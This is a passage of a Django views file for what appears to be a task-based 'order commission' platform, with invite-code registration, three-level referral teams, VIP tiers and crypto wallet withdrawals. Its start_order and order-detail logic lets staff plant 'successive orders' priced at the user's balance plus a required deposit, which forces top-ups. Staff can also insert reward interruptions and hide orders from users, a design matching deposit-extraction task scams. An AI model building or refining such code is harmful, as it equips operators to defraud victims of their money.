            messages.error(request, 'Invite code must be 6 characters.')
            return redirect('user_register')

        if User.objects.filter(username__iexact=username).exists():
            messages.error(request, 'Username already exists.')
            return redirect('user_register')

        invited_by_profile = UserProfile.objects.filter(
            invite_code__iexact=invite_code
        ).select_related('user').first()

        if not invited_by_profile:
            messages.error(request, 'Invalid invite code.')
            return redirect('user_register')

        user = User.objects.create_user(
            username=username,
            password=password
        )

        profile, created = UserProfile.objects.get_or_create(user=user)

        vip1 = VipLevel.objects.filter(level_name__iexact='VIP1').first()

        profile.phone_number = phone_number
        profile.gender = gender
        profile.transaction_password = make_password(transaction_password)
        profile.invited_by = invited_by_profile
        profile.ip_address = get_client_ip(request)
        profile.vip_level = vip1
        profile.save()

        login(request, user)

        messages.success(request, 'Registration successful.')

        return redirect('user_home')

    return render(request, 'user/register.html', {
        'initial_invite_code': request.GET.get('invite_code', '').strip().upper(),
    })


def user_login(request):
    if request.method == 'POST':
        login_value = request.POST.get('username', '').strip()
        password = request.POST.get('password', '').strip()

        matched_user = User.objects.filter(
            username__iexact=login_value
        ).first()

        if matched_user is None:
            phone_profiles = list(
                UserProfile.objects.select_related('user').filter(
                    phone_number=login_value
                )[:2]
            )

            # Do not guess which account to use if a phone number is duplicated.
            if len(phone_profiles) == 1:
                matched_user = phone_profiles[0].user

        user = None

        if matched_user is not None:
            user = authenticate(
                request,
                username=matched_user.username,
                password=password
            )

        if user is not None:
            login(request, user)

            profile = UserProfile.objects.filter(user=user).first()

            if profile:
                profile.ip_address = get_client_ip(request)
                profile.online_status = 'online'
                profile.recent_login = timezone.now()
                profile.save()

            return redirect('user_home')

        messages.error(request, 'Invalid username, phone number, or password.')
        return redirect('user_login')

    return render(request, 'user/login.html')


def terms_and_conditions(request):
    return render(request, 'user/terms_and_conditions.html', {
        'home_settings': HomePageSettings.load(),
    })


@login_required(login_url='user_login')
def user_content_page(request, page_key):
    pages = {
        'campaign': (
            'Campaign',
            'campaign_html',
        ),
        'illustrate': (
            'Illustrate',
            'illustrate_html',
        ),
        'faqs': (
            'FAQs',
            'faqs_html',
        ),
        'company_profile': (
            'Company Profile',
            'company_profile_html',
        ),
    }

    page = pages.get(page_key)

    if page is None:
        return redirect('user_home')

    page_title, content_field = page
    home_settings = HomePageSettings.load()

    return render(request, 'user/content_page.html', {
        'page_title': page_title,
        'page_content': getattr(home_settings, content_field),
        'back_url_name': 'user_home',
    })


@login_required(login_url='user_login')
def transaction_history(request):
    current_type = request.GET.get('type', 'all')

    if current_type not in {'all', 'deposit', 'withdrawal'}:
        current_type = 'all'

    records = []

    if current_type in {'all', 'deposit'}:
        records.extend({
            'type': 'deposit',
            'transaction_id': item.transaction_id,
            'amount': item.amount,
            'status': item.status,
            'remark': item.remark,
            'created_at': item.created_at,
        } for item in DepositRecord.objects.filter(user=request.user))

    if current_type in {'all', 'withdrawal'}:
        records.extend({
            'type': 'withdrawal',
            'transaction_id': item.transaction_id,
            'amount': item.amount,
            'status': item.status,
            'remark': item.remark,
            'created_at': item.created_at,
        } for item in WithdrawalRequest.objects.filter(user=request.user))

    records.sort(key=lambda item: item['created_at'], reverse=True)

    return render(request, 'user/transaction_history.html', {
        'records': records,
        'current_type': current_type,
    })


@login_required(login_url='user_login')
def more_services(request):
    return render(request, 'user/more_services.html')


@login_required(login_url='user_login')
def my_team(request):
    profile = get_object_or_404(
        UserProfile.objects.select_related('user', 'vip_level'),
        user=request.user,
    )

    direct_invites = list(
        profile.invited_users.select_related('user', 'vip_level').order_by('-registration_time')
    )

    level_one_ids = [member.id for member in direct_invites]
    level_two_ids = list(
        UserProfile.objects.filter(invited_by_id__in=level_one_ids).values_list('id', flat=True)
    ) if level_one_ids else []
    level_three_ids = list(
        UserProfile.objects.filter(invited_by_id__in=level_two_ids).values_list('id', flat=True)
    ) if level_two_ids else []

    team_profile_ids = level_one_ids + level_two_ids + level_three_ids
    team_user_ids = UserProfile.objects.filter(
        id__in=team_profile_ids
    ).values_list('user_id', flat=True)

    completed_orders = UserOrder.objects.filter(
        user=request.user,
        status='completed',
    )

    today = timezone.localdate()
    today_earnings = completed_orders.filter(
        completed_at__date=today
    ).aggregate(total=Sum('commission'))['total'] or Decimal('0.00')

    total_earnings = completed_orders.aggregate(
        total=Sum('commission')
    )['total'] or Decimal('0.00')

    order_revenue = completed_orders.aggregate(
        total=Sum('order_price')
    )['total'] or Decimal('0.00')

    team_earnings = UserOrder.objects.filter(
        user_id__in=team_user_ids,
        status='completed',
    ).aggregate(total=Sum('commission'))['total'] or Decimal('0.00')

    register_url = reverse('user_register')
    invitation_link = request.build_absolute_uri(
        f'{register_url}?invite_code={profile.invite_code}'
    )

    return render(request, 'user/my_team.html', {
        'profile': profile,
        'direct_invites': direct_invites,
        'direct_invite_count': len(direct_invites),
        'team_member_count': len(team_profile_ids),
        'today_earnings': today_earnings,
        'total_earnings': total_earnings,
        'order_revenue': order_revenue,
        'team_earnings': team_earnings,
        'invitation_link': invitation_link,
    })


@login_required(login_url='user_login')
def user_order_info_page(request, page_key):
    pages = {
        'order_description': (
            'Order Description',
            'order_description_html',
        ),
        'please_note': (
            'Please Note',
            'please_note_html',
        ),
    }

    page = pages.get(page_key)

    if page is None:
        return redirect('user_order')

    page_title, content_field = page
    home_settings = HomePageSettings.load()

    return render(request, 'user/content_page.html', {
        'page_title': page_title,
        'page_content': getattr(home_settings, content_field),
        'back_url_name': 'user_order',
    })

@login_required(login_url='user_login')
def verify_withdrawal_password(request):
    if request.method == 'POST':
        password = request.POST.get('transaction_password', '').strip()
        profile = UserProfile.objects.filter(user=request.user).first()

        if profile and check_password(password, profile.transaction_password):
            return JsonResponse({'success': True})

        return JsonResponse({
            'success': False,
            'message': 'Incorrect transaction password.'
        })

    return JsonResponse({'success': False})

def user_logout(request):
    if request.user.is_authenticated:
        profile = UserProfile.objects.filter(user=request.user).first()

        if profile:
            profile.online_status = 'offline'
            profile.save()

    logout(request)

    return redirect('user_login')


@login_required(login_url="user_login")
def user_home(request):
    return render(
        request,
        "user/home.html",
        {"home_settings": HomePageSettings.load()},
    )

@login_required(login_url='user_login')
def user_withdraw(request):
    profile = get_object_or_404(UserProfile, user=request.user)

    if request.method == 'POST':
        amount = Decimal(request.POST.get('amount', '0') or '0')
        wallet_address = request.POST.get('wallet_address', '').strip()
        transaction_password = request.POST.get('transaction_password', '').strip()

        if amount <= 0:
            messages.error(request, 'Invalid withdrawal amount.')
            return redirect('user_withdraw')

        if amount > profile.balance:
            messages.error(request, 'Insufficient balance.')
            return redirect('user_withdraw')

        if profile.vip_level:
            if amount < profile.vip_level.minimum_withdrawal:
                messages.error(request, f'Minimum withdrawal is {profile.vip_level.minimum_withdrawal} USD.')
                return redirect('user_withdraw')

            if amount > profile.vip_level.maximum_withdrawal:
                messages.error(request, f'Maximum withdrawal is {profile.vip_level.maximum_withdrawal} USD.')
                return redirect('user_withdraw')

        if not wallet_address:
            messages.error(request, 'Wallet address is required.')
            return redirect('user_withdraw')

        if not check_password(transaction_password, profile.transaction_password):
            messages.error(request, 'Incorrect withdrawal password.')
            return redirect('user_withdraw')

        profile.balance -= amount
        profile.wallet_address = wallet_address
        profile.save()

        WithdrawalRequest.objects.create(
            user=request.user,
            amount=amount,
            wallet_address=wallet_address,
            status='pending'
        )

        messages.success(request, 'Withdrawal request submitted successfully.')
        return redirect('user_withdraw')

    withdrawals = WithdrawalRequest.objects.filter(user=request.user).order_by('-id')[:10]

    return render(request, 'user/user_partials/withdraw.html', {
        'profile': profile,
        'withdrawals': withdrawals,
    })


@login_required(login_url='user_login')
def user_records(request):
    current_status = request.GET.get("status", "all")

    orders = UserOrder.objects.filter(
        user=request.user,
        is_hidden_from_user=False
    ).select_related(
        "product",
        "lucky_reward"
    ).order_by("-created_at")

    if current_status == "pending":
        orders = orders.filter(status__in=["waiting", "matched"])

    elif current_status == "completed":
        orders = orders.filter(status="completed")

    return render(request, "user/records.html", {
        "orders": orders,
        "current_status": current_status,
    })


@login_required(login_url="user_login")
def user_order(request):
    profile = request.user.userprofile

    active_order = UserOrder.objects.filter(
        user=request.user,
        status="matched"
    ).select_related("product").first()

    completed_orders = UserOrder.objects.filter(
        user=request.user,
        status="completed",
        is_hidden_from_user=False
    ).select_related("product").order_by("-completed_at")[:20]

    remaining_frozen = Decimal("0.00")

    if active_order and active_order.is_successive_order:

        remaining_frozen = (
            active_order.order_price -
            profile.balance
        )

        if remaining_frozen < Decimal("0.00"):
            remaining_frozen = Decimal("0.00")

    latest_lucky_reward = None

    if profile.task_progress > 0:

        latest_lucky_reward = LuckyReward.objects.filter(
            profile=profile,
            status="completed",
            target_order_number__lte=profile.task_progress
        ).order_by(
            "-completed_at",
            "-id"
        ).first()

    return render(
        request,
        "user/order.html",
        {
            "active_order": active_order,
            "completed_orders": completed_orders,
            "remaining_frozen": remaining_frozen,
            "latest_lucky_reward": latest_lucky_reward,
            "home_settings": HomePageSettings.load(),
        }
    )

@staff_required
def staff_reset_user_tasks(request, profile_id):

    profile = get_object_or_404(
        UserProfile,
        id=profile_id
    )

    if request.method == "POST":

        UserOrder.objects.filter(
            user=profile.user,
            status="matched"
        ).update(
            status="cancelled"
        )

        profile.task_progress = 0
        profile.save()

        messages.success(
            request,
            "Task progress reset successfully."
        )

    return redirect("staff_user_management")


@login_required(login_url="user_login")
def start_order(request):
    profile = request.user.userprofile

    max_tasks = 0

    if profile.vip_level:
        max_tasks = profile.vip_level.maximum_task

    if max_tasks and profile.task_progress >= max_tasks:
        messages.error(
            request,
            "You have reached your daily task limit."
        )
        return redirect("user_order")

    pending_reward = LuckyReward.objects.filter(
        profile=profile,
        status="pending"
    ).first()

    if pending_reward:
        return redirect(
            "lucky_reward_animation",
            reward_id=pending_reward.id
        )

    active_order = UserOrder.objects.filter(
        user=request.user,
        status="matched"
    ).first()

    if active_order:
        messages.warning(
            request,
            "You have a pending order. Please complete it before starting a new order."
        )
        return redirect("user_order")

    next_order_number = profile.task_progress + 1

    reward = LuckyReward.objects.filter(
        profile=profile,
        target_order_number=next_order_number,
        status="waiting"
    ).first()

    if reward:
        reward.status = "processing"
        reward.save()

        return redirect(
            "lucky_reward_animation",
            reward_id=reward.id
        )

    successive_plan = SuccessiveOrderPlan.objects.filter(
        profile=profile,
        target_order_number=next_order_number,
        status="waiting"
    ).select_related("product").first()

    if successive_plan:
        required_deposit = abs(successive_plan.negative_amount)

        order_price = profile.balance + required_deposit

        commission_rate = Decimal("0")

        if profile.vip_level:
            commission_rate = profile.vip_level.successive_order_commission_rate

        commission = order_price * commission_rate / Decimal("100")

        order = UserOrder.objects.create(
            user=request.user,
            product=successive_plan.product,
            order_type="successive",
            order_price=order_price,
            commission=commission,
            status="matched",
            is_successive_order=True,
            successive_order_number=next_order_number,
            negative_amount=successive_plan.negative_amount
        )

        successive_plan.status = "matched"
        successive_plan.matched_order = order
        successive_plan.matched_at = timezone.now()
        successive_plan.save()

        return redirect(
            "user_order_detail",
            order_id=order.id
        )

    product = Product.objects.order_by("?").first()

    if not product:
        messages.error(
            request,
            "No product found."
        )
        return redirect("user_order")

    commission_rate = Decimal("0")

    if profile.vip_level:
        commission_rate = profile.vip_level.commission_rate

    commission = product.price * commission_rate / Decimal("100")

    order = UserOrder.objects.create(
        user=request.user,
        product=product,
        order_type="normal",
        order_price=product.price,
        commission=commission,
        status="matched"
    )

    return redirect(
        "user_order_detail",
        order_id=order.id
    )


@login_required(login_url="user_login")
def user_order_detail(request, order_id):
    profile = request.user.userprofile

    if user_has_blocking_lucky_reward(profile):
        pending_reward = LuckyReward.objects.filter(
            profile=profile,
            status="pending"
        ).first()

        return redirect(
            "lucky_reward_animation",
            reward_id=pending_reward.id
        )

    order = get_object_or_404(
        UserOrder.objects.select_related("product"),
        id=order_id,
        user=request.user
    )

    remaining_frozen = Decimal("0.00")
    insufficient_balance = False

    if order.is_successive_order:
        remaining_frozen = order.order_price - profile.balance

        if remaining_frozen < Decimal("0.00"):
            remaining_frozen = Decimal("0.00")

        if remaining_frozen > Decimal("0.00"):
            insufficient_balance = True

    else:
        if profile.balance < order.order_price:
            insufficient_balance = True

    return render(request, "user/order_detail.html", {
        "order": order,
        "profile": profile,
        "remaining_frozen": remaining_frozen,
        "insufficient_balance": insufficient_balance,
    })


@login_required(login_url="user_login")
def submit_order(request, order_id):
    profile = request.user.userprofile

    if user_has_blocking_lucky_reward(profile):
        pending_reward = LuckyReward.objects.filter(
            profile=profile,
            status="pending"
        ).first()

        return redirect(
            "lucky_reward_animation",
            reward_id=pending_reward.id
        )

    order = get_object_or_404(
        UserOrder,
        id=order_id,
        user=request.user,
        status="matched"
    )

    if request.method == "POST":

        if profile.balance < order.order_price:
            remaining_topup = order.order_price - profile.balance

            messages.error(
                request,
                f"Insufficient balance. Please top up {remaining_topup} USD."
            )

            return redirect(
                "user_order_detail",
                order_id=order.id
            )

        rating = int(request.POST.get("rating", 5))
        comment = request.POST.get("comment", "").strip()

        order.rating = rating
        order.comment = comment
        order.status = "completed"
        order.completed_at = timezone.now()
        order.save()

        profile.balance += order.commission
        profile.task_progress += 1
        profile.save()

        messages.success(
            request,
            "Order submitted successfully."
        )

        return redirect("user_order")

    return redirect(
        "user_order_detail",
        order_id=order.id
    )

@login_required(login_url='user_login')
def user_messages(request):
    notifications = []

    notifications.extend({
        'id': item.id,
        'type': 'deposit',
        'title': 'Deposit credited',
        'amount': item.amount,
        'status': 'Success',
        'created_at': item.created_at,
        'transaction_id': item.transaction_id,
        'is_read': item.is_read_by_user,
    } for item in DepositRecord.objects.filter(user=request.user))

    withdrawal_titles = {
        'approved': 'Withdrawal successful',
        'pending': 'Withdrawal pending',
        'rejected': 'Withdrawal rejected',
    }

    withdrawal_statuses = {
        'approved': 'Success',
        'pending': 'Pending',
        'rejected': 'Rejected',
    }

    notifications.extend({
        'id': item.id,
        'type': 'withdrawal',
        'title': withdrawal_titles.get(item.status, 'Withdrawal updated'),
        'amount': item.amount,
        'status': withdrawal_statuses.get(item.status, item.status.title()),
        'created_at': item.created_at,
        'transaction_id': item.transaction_id,
        'is_read': item.is_read_by_user,
    } for item in WithdrawalRequest.objects.filter(user=request.user))

    notifications.sort(key=lambda item: item['created_at'], reverse=True)

    return render(request, 'user/messages.html', {
        'notifications': notifications[:20],
    })


@login_required(login_url='user_login')
def user_transaction_notification(request, transaction_type, record_id):
    if transaction_type == 'deposit':
        record = get_object_or_404(DepositRecord, id=record_id, user=request.user)
    elif transaction_type == 'withdrawal':
        record = get_object_or_404(WithdrawalRequest, id=record_id, user=request.user)
    else:
        return redirect('user_messages')

    if not record.is_read_by_user:
        record.is_read_by_user = True
        record.save(update_fields=['is_read_by_user'])

    history_url = reverse('transaction_notice')
    return redirect(f'{history_url}?type={transaction_type}')


@login_required(login_url='user_login')
def user_settings(request):
    profile = request.user.userprofile

    latest_lucky_reward = None

    if profile.task_progress > 0:
        latest_lucky_reward = LuckyReward.objects.filter(
            profile=profile,
            status="completed",
            target_order_number__lte=profile.task_progress
        ).order_by(
            "-completed_at",
            "-id"
        ).first()

    return render(request, 'user/settings.html', {
        'latest_lucky_reward': latest_lucky_reward,
    })

@login_required(login_url='user_login')
def user_trading_account(request):
    profile = get_object_or_404(UserProfile, user=request.user)

    if request.method == 'POST':
        wallet_address = request.POST.get('wallet_address', '').strip()

        if not wallet_address:
            messages.error(request, 'Wallet address is required.')
            return redirect('user_trading_account')

        profile.wallet_address = wallet_address
        profile.save()

        messages.success(request, 'Wallet address saved successfully.')
        return redirect('user_trading_account')

    return render(request, 'user/user_partials/trading_account.html', {
        'profile': profile
    })


@login_required(login_url='user_login')
def user_edit_wallet_address(request):
    profile = get_object_or_404(UserProfile, user=request.user)

    if request.method == 'POST':
        wallet_address = request.POST.get('wallet_address', '').strip()

        if not wallet_address:
            messages.error(request, 'Wallet address is required.')
            return redirect('user_edit_wallet_address')

        profile.wallet_address = wallet_address
        profile.save(update_fields=['wallet_address'])
        messages.success(request, 'Wallet address updated successfully.')
        return redirect('user_edit_wallet_address')

    return render(request, 'user/user_partials/edit_wallet_address.html', {
        'profile': profile,
    })

@login_required(login_url='user_login')
def user_personal_information(request):
    profile = request.user.userprofile
    return render(request, 'user/user_partials/personal_information.html', {'profile': profile})

@login_required(login_url='user_login')
def user_update_email(request):
    if request.method == 'POST':
        email = request.POST.get('email', '').strip()
        request.user.email = email
        request.user.save()
        messages.success(request, 'Email updated successfully.')
        return redirect('user_personal_information')

    return render(request, 'user/user_partials/update_email.html')


@login_required(login_url='user_login')
def user_update_password(request):
    if request.method == 'POST':
        old_password = request.POST.get('old_password', '').strip()
        new_password = request.POST.get('new_password', '').strip()

        if not request.user.check_password(old_password):
            messages.error(request, 'Old password is incorrect.')
            return redirect('user_update_password')

        request.user.set_password(new_password)
        request.user.save()
        update_session_auth_hash(request, request.user)

        messages.success(request, 'Login password updated successfully.')
        return redirect('user_personal_information')

    return render(request, 'user/user_partials/update_password.html')


@login_required(login_url='user_login')
def user_update_transaction_password(request):
    profile = request.user.userprofile

    if request.method == 'POST':
        old_password = request.POST.get('old_transaction_password', '').strip()
        new_password = request.POST.get('new_transaction_password', '').strip()

        if not check_password(old_password, profile.transaction_password):
            messages.error(request, 'Old transaction password is incorrect.')
            return redirect('user_update_transaction_password')

        profile.transaction_password = make_password(new_password)
        profile.save()

        messages.success(request, 'Transaction password updated successfully.')
        return redirect('user_personal_information')

    return render(request, 'user/user_partials/update_transaction_password.html')

@login_required(login_url='user_login')
def customer_service(request):

    if request.method == 'POST':
        message = request.POST.get('message', '').strip()
        image = request.FILES.get('image')

        if image:
            allowed_image_types = {'image/jpeg', 'image/png', 'image/webp', 'image/gif'}

            if image.content_type not in allowed_image_types:
                messages.error(request, 'Please select a JPG, PNG, WEBP, or GIF image.')
                return redirect(f"{reverse('customer_service')}?sent=1")

            if image.size > 5 * 1024 * 1024:
                messages.error(request, 'Image must be 5 MB or smaller.')
                return redirect(f"{reverse('customer_service')}?sent=1")

        if message or image:
            SupportMessage.objects.create(
                user=request.user,
                sender=request.user,
                message=message,
                image=image,
                message_type='image' if image else 'text',
                is_read_by_user=True,
                is_read_by_staff=False
            )

        return redirect(f"{reverse('customer_service')}?sent=1")

    messages_list = SupportMessage.objects.filter(
        user=request.user
    ).order_by('created_at')

    SupportMessage.objects.filter(
        user=request.user,
        sender__is_staff=True,
        is_read_by_user=False
    ).update(is_read_by_user=True)

    return render(request, 'user/customer_service.html', {
        'messages_list': messages_list,
        'show_support_card': request.GET.get('sent') != '1',
    })
